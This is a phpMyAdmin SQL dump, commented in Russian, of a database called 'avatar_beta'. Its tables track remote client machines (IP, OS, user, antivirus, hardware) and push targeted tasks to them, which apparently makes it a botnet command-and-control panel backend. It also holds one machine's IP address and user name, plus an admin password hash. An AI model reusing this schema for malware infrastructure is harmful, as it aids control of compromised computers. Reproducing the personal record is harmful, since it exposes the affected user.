-- phpMyAdmin SQL Dump
-- version 4.8.5
-- https://www.phpmyadmin.net/
--
-- Хост: 127.0.0.1:3306
-- Время создания: Окт 17 2019 г., 17:43
-- Версия сервера: 5.7.26
-- Версия PHP: 5.6.40

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- База данных: `avatar_beta`
--

-- --------------------------------------------------------

--
-- Структура таблицы `clients`
--

DROP TABLE IF EXISTS `clients`;
CREATE TABLE IF NOT EXISTS `clients` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `uuid` text NOT NULL,
  `ip` text NOT NULL,
  `location` text NOT NULL,
  `os` text NOT NULL,
  `user` text NOT NULL,
  `role` text NOT NULL,
  `antivirus` text NOT NULL,
  `cpu` text NOT NULL,
  `ram` text NOT NULL,
  `storage` text NOT NULL,
  `network` int(10) NOT NULL,
  `added` text NOT NULL,
  `seen` text NOT NULL,
  `version` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `clients`
--

INSERT INTO `clients` (`id`, `uuid`, `ip`, `location`, `os`, `user`, `role`, `antivirus`, `cpu`, `ram`, `storage`, `network`, `added`, `seen`, `version`) VALUES
(11, 'E2D29700-72BA-11E3-B3DF-704D7B63404A', '5.166.185.167', 'RU', 'Майкрософт Windows 10 Pro', 'DESKTOP-V3CA4EU/Etsoro', 'User', 'Windows Defender', 'Intel(R) Core(TM) i7-7700 CPU @ 3.60GHz', '16317 MB', '379 / 1467 GB', 1, '2019-10-17 20:43:42', '2019-10-17 20:43:42', '0.9.7');

-- --------------------------------------------------------

--
-- Структура таблицы `tasks`
--

DROP TABLE IF EXISTS `tasks`;
CREATE TABLE IF NOT EXISTS `tasks` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `title` text NOT NULL,
  `type` text NOT NULL,
  `content` text NOT NULL,
  `target` text NOT NULL,
  `trigger` text NOT NULL,
  `limit` int(10) NOT NULL,
  `client_id` text NOT NULL,
  `location` text NOT NULL,
  `os` text NOT NULL,
  `role` text NOT NULL,
  `antivirus` text NOT NULL,
  `cpu` text NOT NULL,
  `ram` text NOT NULL,
  `storage_type` text NOT NULL,
  `storage` text NOT NULL,
  `network_type` text NOT NULL,
  `network` text NOT NULL,
  `status` text NOT NULL,
  `total_done` int(10) NOT NULL,
  `total_failed` int(10) NOT NULL,
  `added` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=24 DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `tasks_completed`
--

DROP TABLE IF EXISTS `tasks_completed`;
CREATE TABLE IF NOT EXISTS `tasks_completed` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `task_id` int(11) NOT NULL,
  `client_uuid` text NOT NULL,
  `details` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `tasks_completed`
--

INSERT INTO `tasks_completed` (`id`, `task_id`, `client_uuid`, `details`) VALUES
(5, 14, 'E2D29700-72BA-11E3-B3DF-704D7B63404A', 'Success');

-- --------------------------------------------------------

--
-- Структура таблицы `tasks_failed`
--

DROP TABLE IF EXISTS `tasks_failed`;
CREATE TABLE IF NOT EXISTS `tasks_failed` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `task_id` int(11) NOT NULL,
  `client_uuid` text NOT NULL,
  `details` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `users`
--

DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `login` text NOT NULL,
  `password` text NOT NULL,
  `role` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `users`
--

INSERT INTO `users` (`id`, `login`, `password`, `role`) VALUES
(3, 'admin', '$2y$10$6l98jkB00VZkXrOXEZqbTO3zItyWyrDDOj.4ywp5eIdtMWdWTXBqm', 'Administrator');
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
